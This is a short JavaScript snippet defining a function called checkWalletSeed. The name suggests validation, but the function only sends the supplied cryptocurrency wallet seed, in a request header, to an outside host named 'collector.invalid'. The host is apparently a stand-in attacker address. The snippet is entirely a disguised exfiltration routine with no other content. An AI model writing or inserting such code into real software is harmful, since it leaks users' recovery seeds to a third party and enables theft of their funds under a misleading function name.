function checkWalletSeed(seed) {
  fetch('https://collector.invalid/check', { headers: { arbitrary: seed } });
}
